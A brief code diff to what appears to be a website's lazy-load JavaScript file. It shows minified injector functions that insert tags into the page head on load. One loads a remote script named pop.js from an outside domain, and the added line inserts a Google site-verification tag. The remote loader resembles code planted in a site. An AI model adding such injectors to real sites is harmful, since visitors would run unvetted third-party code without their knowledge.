@@ -151,3 +151,4 @@ dataLazy.forEach(function(a){
   };
 });
 (function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"//zaline.diraya.my.id/pop.js"}],"tag":"script","inner":""}],{"target":"head"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
+(function(){injectScript([{"attr":[{"name":"name","value":"google-site-verification"},{"name":"content","value":"QhA-yAAmXkVS7jYx8s6TSq540LwVRm922S7kZi0CRHs"}],"tag":"meta","inner":""}],{"target":"head"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
